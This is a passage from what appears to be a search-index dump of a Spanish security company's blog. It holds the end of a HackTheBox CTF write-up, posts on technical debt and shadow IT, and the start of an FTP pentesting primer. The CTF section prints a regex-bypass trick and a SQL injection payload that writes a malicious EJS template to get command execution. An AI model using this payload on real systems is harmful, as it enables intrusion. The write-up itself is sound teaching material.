<pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>Un an\u00e1lisis m\u00e1s detallado muestra que la expresi\u00f3n no es multil\u00ednea, lo que nos permite realizar un bypass con un salto de l\u00ednea (<code>n</code>).</p> <ul> <li>Sin salto de l\u00ednea.</li> </ul> La expresi\u00f3n regular coincide con nuestro payload <ul> <li>Con salto de l\u00ednea.</li> </ul> La expresi\u00f3n regular no coincide con nuestro payload <p>Una vez descubierto esto, podemos construir un payload para una inyecci\u00f3n SQL que escriba un archivo EJS malicioso en la ruta de error 404, ya que la aplicaci\u00f3n no tiene una ruta para manejar este tipo de error.</p> <p>El payload que construimos deber\u00eda ser similar al siguiente, donde incluimos la plantilla EJS que leer la bandera ejecutando el binario objetivo.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>Con el archivo malicioso en su lugar, accedemos a la ruta inexistente lanzando un error 404 y ejecutando el comando /readflag. Esto nos da acceso al contenido de la bandera.</p> Lectura de la bandera <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/09-02-2025/","title":"Deuda t\u00e9cnica: un mal necesario en el desarrollo de software","text":"<p>En Atlansec, aunque somos principalmente una empresa de ciberseguridad, tambi\u00e9n abordamos la deuda t\u00e9cnica desde la perspectiva del desarrollo de software seguro y la seguridad de las infraestructuras. Construir c\u00f3digo seguro e infraestructuras robustas es clave para reducir las vulnerabilidades y garantizar la mantenibilidad a largo plazo.</p> <p>La deuda t\u00e9cnica es un enemigo inevitable que acompa\u00f1a a todos los proyectos de software en mayor o menor medida. Sin embargo, no siempre es perjudicial y, en algunos casos, puede ser una estrategia necesaria para alcanzar objetivos cr\u00edticos en un plazo determinado.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#que-es-la-deuda-tecnica","title":"\u00bfQu\u00e9 es la deuda t\u00e9cnica?","text":"<p>La deuda t\u00e9cnica representa el coste de arreglar un c\u00f3digo sub\u00f3ptimo o mal implementado que resulta de acelerar el desarrollo para cumplir los plazos. Es el precio que se paga cuando se prioriza la velocidad sobre la calidad del software.</p> <p>Su origen est\u00e1 en la necesidad de lanzar r\u00e1pidamente nuevas funcionalidades, a menudo sacrificando aspectos fundamentales como la mantenibilidad y claridad de c\u00f3digo. Pero, \u00bfes siempre negativa?</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#es-la-deuda-tecnica-intrinsecamente-mala","title":"\u00bfEs la deuda t\u00e9cnica intr\u00ednsecamente mala?","text":"<p>Depende del contexto. Acelerar el desarrollo de forma controlada para cumplir un plazo cr\u00edtico no es lo mismo que escribir c\u00f3digo desordenado por ignorancia o por falta de buenas pr\u00e1cticas.</p> <p>Asana resume bien este concepto en cuatro cuadrantes de deuda t\u00e9cnica:</p> Cuadrante de deuda t\u00e9cnica de Asana","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#los-4-cuadrantes-de-la-deuda-tecnica","title":"Los 4 Cuadrantes de la Deuda T\u00e9cnica","text":"<ol> <li>Prudente y deliberada: La decisi\u00f3n consciente de aplicar una soluci\u00f3n r\u00e1pida y afrontar las consecuencias m\u00e1s adelante. Este tipo de deuda es aceptable cuando el riesgo es bajo, y las ventajas de una entrega r\u00e1pida superan a las desventajas.</li> <li>Imprudente y deliberada: Tener los conocimientos y la capacidad de escribir un buen c\u00f3digo, pero optar por dar prioridad a la velocidad sin una estrategia para mitigar la duda resultante. Este enfoque a menudo conduce a problemas a largo plazo.</li> <li>Prudente e inadvertido: Intentar producir el mejor c\u00f3digo posible pero descubrir una mejor soluci\u00f3n m\u00e1s tarde. En este caso, la deudo no se debe a malas pr\u00e1cticas sino al aprendizaje y evoluci\u00f3n del software.</li> <li>Imprudente e inadvertido: La duda se genera de forma inconsciente, ya se a por desconocimiento o por falta de experiencia en buenas pr\u00e1cticas de desarrollo. Este tipo de duda es especialmente arriesgada, ya que puede acumularse sin que el equipo se d\u00e9 cuenta.</li> </ol>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#tipos-de-deudas-tecnicas","title":"Tipos de Deudas T\u00e9cnicas","text":"","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#1-intencionada","title":"1. Intencionada","text":"<p>Este tipo de duda es generada cuando se toman decisiones deliberadas para priorizar la entrega de funcionalidad, sabiendo que el c\u00f3digo requerir\u00e1 de mejoras en el futuro. Es com\u00fan en proyectos con plazos ajustados o cuando es necesario validar una idea antes de optimizar el c\u00f3digo.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#2-no-intencionada","title":"2. No intencionada","text":"<p>Se produce debido a errores, falta de conocimiento o c\u00f3digo mal escrito sin que el equipo sea consciente de las consecuencias. Esta duda es a menudo la m\u00e1s peligrosa ya que se puede acumular hasta un nivel inmanejable.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#ejemplos-de-deudas-tecnicas","title":"Ejemplos de Deudas T\u00e9cnicas","text":"<p>La duda t\u00e9cnica aparece de muchas formas y puede surgir por diversas causas. Abajo encontramos algunos ejemplos comunes encontrados en proyectos de desarrollo software:</p> <ul> <li>Deuda T\u00e9cnica Arquitect\u00f3nica: Un dise\u00f1o arquitect\u00f3nico deficiente puede conducir a problemas significativos a largo plazo. Por ejemplo:</li> <li>Monolitos dif\u00edcil de escalar: Un \u00fanico bloque de c\u00f3digo puede dificultar la escalabilidad y la flexibilidad. </li> <li>Pobre separaci\u00f3n de preocupaciones: Una arquitectura mal dise\u00f1ada puede dificultar la modularidad y la reutilizaci\u00f3n de c\u00f3digo.</li> <li>Dependencias excesivas: El alto acoplamiento entre componentes hace que las modificaciones sean costosas y arriesgadas.</li> <li>Falta de documentaci\u00f3n de la arquitectura: Sin una gu\u00eda clara, el equipo puede tomar decisiones que agraven la deuda t\u00e9cnica.</li> <li>Documentaci\u00f3n insuficiente: Los proyectos con una documentaci\u00f3n probe o inexistente puede conducir a los desarrolladores a malinterpretar el prop\u00f3sito del c\u00f3digo, las features o la arquitectura. Esto crea una brecha de conocimiento, que puede acumular deuda t\u00e9cnica cuando se hacen suposiciones incorrectas o cuando los nuevos desarrolladores luchan por entender el sistema.</li> <li>C\u00f3digo duplicado: C\u00f3digo redundante o copiar y pegar c\u00f3digo en diferentes partes del sistema sugiere que el equipo no ha considerado adecuadamente las oportunidades de reutilizaci\u00f3n de c\u00f3digo.</li> <li>Bibliotecas o APIs obsoletas: Si un proyecto depende en bibliotecas o APIs obsoletas, ser\u00e1 cada vez m\u00e1s dif\u00edcil de asegurar, mantener y expandir a medida que estas dependencias dejen de tener soporte.</li> </ul>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#impacto-de-la-deuda-tecnica","title":"Impacto de la Deuda T\u00e9cnica","text":"<p>La deuda t\u00e9cnica puede tener un impacto significativo en el desarrollo software y en las operaciones empresariales. Algunas consecuencias negativas incluyen:</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#retrasos-en-el-desarrollo","title":"Retrasos en el Desarrollo","text":"<p>A medida de que la deuda t\u00e9cnica se acumula, aumenta el tiempo necesario para implementar nuevas caracter\u00edsticas o solucionar problemas. Los atajos tomados inicialmente se traducen en un en un mayor esfuerzo y en m\u00e1s tiempo invertido posteriormente.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#mayores-costes-de-mantenimiento","title":"Mayores Costes de Mantenimiento","text":"<p>El mantenimiento del software con deuda t\u00e9cnica requiere m\u00e1s tiempo y recursos. Los problemas subyacentes deben de ser abordados antes de poder realizar cambios o mejoras adicionales, lo que incrementa los costes operativos a largo plazo.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#menor-calidad-del-software","title":"Menor Calidad del Software","text":"<p>La deuda t\u00e9cnica se traduce a menudo como c\u00f3digo de baja calidad, que da lugar a errores y fallos frecuentes. Esto afecta a la satisfacci\u00f3n del cliente y a la reputaci\u00f3n de la empresa.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#dificultad-para-atraer-y-retener-talento","title":"Dificultad para Atraer y Retener Talento","text":"<p>Los desarrolladores cualificados prefieren trabajar en proyectos bien mantenidos y t\u00e9cnicamente s\u00f3lidos. Acumular deuda t\u00e9cnica puede dificultar la contrataci\u00f3n y retenci\u00f3n de personal cualificado.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#como-gestionar-y-reducir-la-deuda-tecnica","title":"C\u00f3mo Gestionar y Reducir la Deuda T\u00e9cnica","text":"<p>En Atlansec, entendemos que la gesti\u00f3n de la deuda t\u00e9cnica es crucial para el \u00e9xito de cualquier proyecto software. Por lo tanto, adoptamos un enfoque proactivo basado en las siguientes estrategias:</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#1-refactorizacion-continua","title":"1. Refactorizaci\u00f3n Continua","text":"<p>Adoptar una cultura de refactorizaci\u00f3n continua ayuda a mejorar la calidad del c\u00f3digo sin afectar a la entrega de nuevas caracter\u00edsticas. Los peque\u00f1os ajustes frecuentes pueden prevenir la acumulaci\u00f3n de deuda t\u00e9cnica.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#2-revisiones-del-codigo","title":"2. Revisiones del C\u00f3digo","text":"<p>Las revisiones de c\u00f3digo permiten identificar los problemas antes de que se conviertan en deuda. Fomentar la colaboraci\u00f3n entre desarrolladores garantizan mejores pr\u00e1cticas y c\u00f3digo de mayor calidad.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#3-automatizacion-de-pruebas-y-cicd","title":"3. Automatizaci\u00f3n de pruebas y CI/CD","text":"<p>El uso de canales de pruebas automatizados e integraci\u00f3n/despliegue continuos (CI/CD) permiten la r\u00e1pida detecci\u00f3n de problemas y previenen la acumulaci\u00f3n de deuda t\u00e9cnica no intencionada.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#4-documentacion-y-buenas-practicas","title":"4. Documentaci\u00f3n y Buenas Pr\u00e1cticas","text":"<p>Escribir una documentaci\u00f3n clara y seguir patrones de dise\u00f1os establecidos facilita el mantenimiento del c\u00f3digo y reduce el riesgo de generar deuda t\u00e9cnica debido a malentendidos.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#5-planificacion-tecnica-desde-el-principio","title":"5. Planificaci\u00f3n T\u00e9cnica desde el Principio","text":"<p>Centrarse en un dise\u00f1o arquitect\u00f3nico adecuado antes de que el desarrollo comience puede prevenir problemas a largo plazo. Invertir tiempo en la planificaci\u00f3n evita muchas decisiones precipitadas que generan deudas. </p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-02-2025/#enlaces-relacionados","title":"Enlaces Relacionados","text":"<ul> <li>Asana - Deuda T\u00e9cnica</li> <li>Atlassian -  Deuda T\u00e9cnica en Agile</li> </ul> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Desarrollo de software","Deuda t\u00e9cnica","Calidad del c\u00f3digo","Mantenimiento del software","Desarrollo \u00e1gil","CI/CD","Refactorizaci\u00f3n","Ingenier\u00eda de software"]},{"location":"es/blog/posts/09-03-2025/","title":"LAN Wars: La amenaza fantasma","text":"<p>Hace mucho mucho tiempo, en un escritorio cercano....</p> <p>La red corporativa est\u00e1 sumida en el caos. La implementaci\u00f3n de pol\u00edticas de seguridad en los sistemas de la empresa se encuentra en disputa.</p> <p>Esperando resolver sus asuntos con un pu\u00f1ado de herramientas no aprobadas, los codiciosos rebeldes TI han detenido toda colaboraci\u00f3n con el equipo de TI e instaurado su propio software.</p> <p>Mientras el equipo de TI debate interminablemente sobre otros asuntos, el CISO ha enviado en secreto a dos expertos en ciberseguridad, guardianes del cumplimiento y el zero trust, para restaurar el orden y mantener la seguridad en la red.</p> <p>\u00bfTe suena esta pel\u00edcula? Mejor aprender sobre ella ahora que cuando se convierta en una pel\u00edcula de terror. En este post hablaremos sobre el problema del Shadow IT y c\u00f3mo afrontarlo.   </p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#que-es-el-shadow-it","title":"\u00bfQu\u00e9 es el Shadow IT?","text":"<p>El Shadow IT, o TI en la sombra, es como esa fuerza rebelde que opera al margen del Imperio - perd\u00f3n, del departamento de TI oficial. Se refiere a todas aquellas aplicaciones, dispositivos y servicios que los empleados utilizan sin la aprobaci\u00f3n formal.</p> <p>Algunos casos pueden ser: </p> <ul> <li>Usar WhatsApp para compartir documentos de trabajo porque el sistema oficial es demasiado lento.</li> <li>Que un equipo interno decida usar Trello porque el JIRA de la empresa es complicado para ellos.</li> <li>Hacer uso de iLovePDF para convertir documentos de la empresa.</li> <li>Instalar un crack de PhotoShop por no tener licencia.</li> <li>Montar AnyDesk para poder acceder a tu equipo desde casa.</li> </ul> <p>Y no, no estamos hablando de casos aislados. Seg\u00fan estudios recientes, hasta el 80% de los trabajadores admiten usar aplicaciones no autorizadas en su trabajo diario. Desde servicios en la nube gratuitos hasta aplicaciones de productividad, el Shadow IT est\u00e1 m\u00e1s extendido de lo que muchos CISOs quisieran admitir.</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#riesgos-de-esta-practica","title":"Riesgos de esta pr\u00e1ctica","text":"<p>Como en la mayor\u00eda de los casos, los peligros acechan en las sombras. Algunas pr\u00e1cticas aparentemente inofensivas pueden llevar a ataques devastadores. Veamos los principales focos de Shadow IT y los riesgos asociados:</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#dispositivos-personales-byod","title":"Dispositivos Personales (BYOD)","text":"<p>El uso de dispositivos personales puede parecer inofensivo, e incluso deseable por la flexibilidad que otorga al usuario, pero estos \"infiltrados\" en nuestra red pueden:</p> <ul> <li>Exponer nuestra red a amenazas externas: Este equipo puede haber sido comprometido previamente por malware o alg\u00fan otro ataque y actuar como vector de entrada.</li> <li>Exponer informaci\u00f3n corporativa en esferas no confiables: Algunas caracter\u00edsticas como la sincronizaci\u00f3n en la nube pueden exponer informaci\u00f3n a third parties no confiables.</li> <li>Facilitar movimientos laterales: Un atacante puede usar la m\u00e1quina para moverse c\u00f3modamente por la red al no contar con las soluciones de seguridad corporativas. </li> </ul>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#aplicaciones-no-autorizadas","title":"Aplicaciones No Autorizadas","text":"<p>El uso de aplicaciones puede ahorrar un tiempo precioso al equipo de la empresa, pero siempre debe haber un proceso de aprobaci\u00f3n y asegurarnos de que se cumplen ciertos est\u00e1ndares. Las aplicaciones instaladas sin control pueden tener consecuencias devastadoras, entre las que se incluyen:</p> <ul> <li>Introducir vulnerabilidades en los equipos que alojan la aplicaci\u00f3n: Estas aplicaciones pueden contener vulnerabilidades de seguridad aprovechables por un atacante para ganar privilegios o comprometer el sistema que aloja la aplicaci\u00f3n.</li> <li>Exponer nuestra red a amenazas externas: Todos conocemos alg\u00fan caso de persona que descarga cierto software (OBS por ejemplo) desde el navegador y el primer resultado les lleva a instalar un clon de la aplicaci\u00f3n que contiene alg\u00fan tipo de malware. Esto pas\u00f3 con Keepas hace un tiempo. </li> </ul>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#extensiones-de-navegador","title":"Extensiones de navegador","text":"<p>Estos peque\u00f1os a\u00f1adidos, aparentemente inofensivos, pueden ser tan peligrosos como un droide esp\u00eda:</p> <ul> <li>Exponer nuestra compa\u00f1\u00eda a amenazas externas: No es algo nuevo, pero recientemente se ha visto la escala. Hace unos meses comprometieron una serie de extensiones de navegador y las usaron para robar informaci\u00f3n del navegador de los usuarios de la extensi\u00f3n. Si bien podr\u00edamos pensar que es un caso aislado, existen portales de venta extensiones de navegador, donde cualquiera podr\u00eda comprar una extensi\u00f3n confiable para los usuarios y posteriormente manipular su c\u00f3digo.</li> <li>Exponer informaci\u00f3n corporativa en esferas no confiables: Ya sea con fines maliciosos o no, muchas extensiones deben procesar informaci\u00f3n del navegador del usuario y mandar cierta informaci\u00f3n a los servidores del creador de la aplicaci\u00f3n. Cabe preguntarse c\u00f3mo de seguros est\u00e1n los datos que se almacenan y cu\u00e1nto control hay realmente sobre qu\u00e9 datos se mandan.</li> </ul>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#agentes-de-ia-y-chatbots","title":"Agentes de IA y Chatbots","text":"<p>\"Estos s\u00ed son los bots que buscas.\" Los nuevos aliados tecnol\u00f3gicos tambi\u00e9n pueden entra\u00f1ar riesgos:</p> <ul> <li>Env\u00edo de informaci\u00f3n confidencial a servicios externos: Si bien con entrenamiento y con sentido com\u00fan estos agentes pueden ser muy \u00fatiles para el usuario y ahorrar much\u00edsimo tiempo, el uso indiscriminado puede llevar a mandar informaci\u00f3n confidencial a los proveedores del servicio...</li> </ul>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#como-afrontarlo","title":"C\u00f3mo afrontarlo","text":"<p>La soluci\u00f3n no es construir otra Estrella de la Muerte. En lugar de eso, necesitamos un enfoque m\u00e1s inteligente:</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#entender-las-necesidades-reales","title":"Entender las necesidades reales","text":"<p>Antes de sacar el sable l\u00e1ser, es fundamental comprender por qu\u00e9 los usuarios recurren al Shadow IT. Este proceso comienza con una evaluaci\u00f3n exhaustiva del panorama tecnol\u00f3gico actual de la organizaci\u00f3n. La realizaci\u00f3n de encuestas peri\u00f3dicas nos permitir\u00e1 identificar las carencias y frustraciones que experimentan los usuarios con las herramientas oficiales. Es crucial establecer canales de comunicaci\u00f3n abiertos donde los empleados puedan expresar sus necesidades tecnol\u00f3gicas sin temor a represalias.</p> <p>El an\u00e1lisis de los patrones de uso de herramientas no autorizadas nos proporcionar\u00e1 informaci\u00f3n valiosa sobre las funcionalidades que los usuarios consideran imprescindibles. Esta informaci\u00f3n, combinada con la identificaci\u00f3n de cuellos de botella en los procesos oficiales, nos ayudar\u00e1 a comprender d\u00f3nde necesitamos mejorar nuestras soluciones corporativas.</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#monitorizacion-y-deteccion","title":"Monitorizaci\u00f3n y Detecci\u00f3n","text":"<p>Un sistema efectivo de control del Shadow IT requiere una estrategia de monitorizaci\u00f3n robusta pero no intrusiva. La implementaci\u00f3n de sistemas de descubrimiento de aplicaciones en la red debe complementarse con herramientas de monitorizaci\u00f3n del tr\u00e1fico que nos permitan identificar patrones de uso inusuales o potencialmente riesgosos. Deben realizarse auditor\u00edas peri\u00f3dicas de dispositivos y aplicaciones, pero siempre respetando la privacidad de los usuarios y manteniendo un equilibrio entre seguridad y confianza.</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#crear-una-estrategia-inclusiva","title":"Crear una estrategia inclusiva","text":"<p>La clave est\u00e1 en el entrenamiento y la comunicaci\u00f3n constante. El desarrollo de programas de formaci\u00f3n espec\u00edficos para cada departamento permite abordar las necesidades particulares de diferentes grupos de usuarios. Estos programas deben ir m\u00e1s all\u00e1 de simples presentaciones, incluyendo talleres pr\u00e1cticos y sesiones de preguntas y respuestas que permitan a los usuarios comprender realmente los riesgos y las alternativas disponibles.</p> <p>La creaci\u00f3n de un programa de embajadores de seguridad puede ayudar a difundir las mejores pr\u00e1cticas de manera m\u00e1s org\u00e1nica dentro de la organizaci\u00f3n. La comunicaci\u00f3n regular de actualizaciones, junto con la celebraci\u00f3n de casos de \u00e9xito, ayuda a mantener el compromiso de los usuarios con las pol\u00edticas de seguridad. El reconocimiento p\u00fablico de aquellos que adoptan y promueven pr\u00e1cticas seguras puede crear una cultura positiva en torno a la seguridad de la informaci\u00f3n.</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/09-03-2025/#conclusiones","title":"Conclusiones","text":"<p>El Shadow IT no es el lado oscuro de la fuerza; es m\u00e1s bien un s\u00edntoma de necesidades no satisfechas en tu organizaci\u00f3n. En lugar de combatirlo con prohibiciones y restricciones, la verdadera victoria est\u00e1 en entender por qu\u00e9 surge y crear un ecosistema tecnol\u00f3gico que combine seguridad con usabilidad.</p> <p>Recuerda: la fuerza del cambio est\u00e1 en el equilibrio entre control y flexibilidad. Como dijo un sabio maestro Jedi corporativo: \"El Shadow IT, controlar debes, pero destruir no necesitas\".</p> <p>La pr\u00f3xima vez que descubras una aplicaci\u00f3n no autorizada en tu red, antes de entrar en p\u00e1nico, preg\u00fantate: \u00bfQu\u00e9 necesidad est\u00e1 cubriendo? \u00bfC\u00f3mo podemos ofrecer una alternativa mejor? La respuesta a estas preguntas te guiar\u00e1 hacia una gesti\u00f3n m\u00e1s efectiva de tu infraestructura IT.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Seguridad Corporativa","Gesti\u00f3n de Vulnerabilidades"]},{"location":"es/blog/posts/14-11-2024/","title":"Introducci\u00f3n a FTP","text":"<p>El protocolo FTP (File Transfer Protocol) es un protocolo usado para la transferencia de archivos entre ordenadores en red, este protocolo presenta arquitectura cliente-servidor us\u00e1ndose un servidor para servir archivos que pueden ser accedidos por N clientes. Por defecto, la informaci\u00f3n se transmite en texto plano, aunque existe una versi\u00f3n cifrada del mismo llamada SFTP (Secure File Transfer Protocol).</p> <p>Si bien existen implementaciones con interfaz gr\u00e1fica, en este art\u00edculo haremos uso de la herramienta de l\u00ednea de comandos de FTP, la cual nos da bastante flexibilidad a la hora de trabajar con el protocolo. En art\u00edculos posteriores exploraremos las principales implementaciones de cliente y servidor, aunque en este nos centraremos en explicar los conceptos b\u00e1sicos del protocolo, como trabajar con \u00e9l y como aprovechar algunas malas configuraciones.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#teoria","title":"Teor\u00eda","text":"","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#canales-de-comunicacion","title":"Canales de comunicaci\u00f3n","text":"<p>Para el funcionamiento de FTP se requieren de dos canales de comunicaci\u00f3n, uno para el env\u00edo de comandos y otro para los datos.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#modos-de-conexion","title":"Modos de conexi\u00f3n","text":"","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#activo","title":"Activo","text":"<p>Es el modo de conexi\u00f3n predeterminado para las conexiones FTP, en \u00e9l ocurren dos eventos:</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se intenta abrir una conexi\u00f3n desde el puerto de datos del servidor (20 por defecto) al puerto P+1 del cliente.</li> </ul> <p>Nota</p> <p>El modo activo puede presentar problemas con los firewalls del cliente debido a que intenta crear una conexi\u00f3n directa a un puerto del lado cliente, lo cual puede ser bloqueado por ciertos firewalls.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#pasivo","title":"Pasivo","text":"<p>Este modo surge como soluci\u00f3n al problema de los firewalls del cliente, aqu\u00ed se modifica el flujo de trabajo de modo que tanto la conexi\u00f3n de datos como la conexi\u00f3n del cliente se inician desde el cliente, podemos desglosarlo en dos eventos.</p> <ul> <li>Se establece un canal de comandos en la conexi\u00f3n con el servidor entre el puerto de comandos del servidor (21 por defecto) y un puerto superior a 1023 en el lado cliente (nos referiremos a este como P).</li> <li>Una vez establecida la conexi\u00f3n de datos se abre una conexi\u00f3n de datos desde el puerto P+1 del cliente a un puerto del canal de datos del servidor, este proceso se repite para cada transferencia de archivos ocupando un puerto distinto del servidor en cada conexi\u00f3n (esto puede ser configurado en la mayor\u00eda de los software del lado servidor) .</li> </ul> <p>Nota</p> <p>El modo pasivo requiere de la apertura de un rango de puertos en el firewall, esto puede generar algunos problemas de seguridad si esta apertura de puertos no se configura de manera correcta.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#comandos-ftp","title":"Comandos FTP","text":"<pre><code>CWD  -&gt; Cambia el directorio actual por el especificado\nDELE -&gt; Elimina el archivo especificado\nEPRT -&gt; Establecer un socket para la conexi\u00f3n de datos\nLIST -&gt; Lista los archivos en el directorio actual\nPASV -&gt; Cambia el modo a pasivo\nPWD  -&gt; Muestra el directorio actual \nRETR -&gt; Descarga el archivo especificado\n</code></pre>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#anonymous-login","title":"Anonymous login","text":"<p>Existe una configuraci\u00f3n de FTP que permite el uso de un login para compartir ficheros para cualquier usuario que lo requiera, en caso de que esta configuraci\u00f3n este habilitada un usuario podr\u00eda usar anonymous como nombre de inicio de sesi\u00f3n y cualquier contrase\u00f1a acceder al servidor como un usuario con bajos privilegios, aunque en ciertos casos esto puede llevar a comprometer el sistema entero.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>Es posible abusar de los comandos PORT y ERPT para realizar un escaneo de puertos abiertos mediante un servidor FTP.</p>","tags":["Ciberseguridad","Pentesting","FTP"]},{"location":"es/blog/posts/14-11-2024/#hand-made","title":"Hand-made","text":"<p>Una vez 